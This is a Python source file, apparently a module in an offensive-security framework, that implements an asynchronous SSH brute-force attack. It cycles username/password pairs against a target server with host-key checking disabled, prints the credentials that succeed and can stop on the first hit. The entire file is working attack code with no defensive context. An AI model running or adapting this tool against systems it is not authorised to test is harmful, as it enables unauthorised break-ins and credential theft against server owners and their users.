import asyncssh

from modules.brute_force.bruteforce_login import AsyncBruteForceLogin, StopError


class SSHBruteForce(AsyncBruteForceLogin):

    def __init__(self):
        super().__init__("ssh_bruteforce",
                         ["ssh", "bruteforce", "brute", "force"],
                         "brute force an ssh server",
                         port=22)

    async def login(self, username: str, password: str):
        try:
            async with asyncssh.connect(host=self.rhost,
                                        port=self.rport,
                                        username=username,
                                        password=password,
                                        known_hosts=None):
                print(f"[+] password found: {username}:{password}")
                if self.stop_on_success:
                    raise StopError
                return True
        except asyncssh.Error:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")
        return False
